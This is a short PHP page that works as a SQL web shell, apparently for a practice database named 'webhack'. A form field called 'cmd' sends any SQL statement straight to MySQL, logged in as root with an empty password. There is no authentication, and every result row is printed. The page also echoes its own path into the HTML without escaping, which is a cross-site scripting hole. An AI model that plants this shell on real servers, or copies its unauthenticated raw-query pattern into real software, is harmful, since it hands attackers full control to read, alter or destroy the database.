<?php
 $query = $_GET['cmd'];
 $host = 'localhost';
 $dbname = 'webhack';
 $user = 'root'; 
 $passwd = '';
 
 $dbcon = mysqli_connect($host,$user,$passwd,$dbname);
 $result = mysqli_query($dbcon,$query);
 
?>
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
	
	while ($row = mysqli_fetch_row($result)) {
		print_r($row);
	}

?> 
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>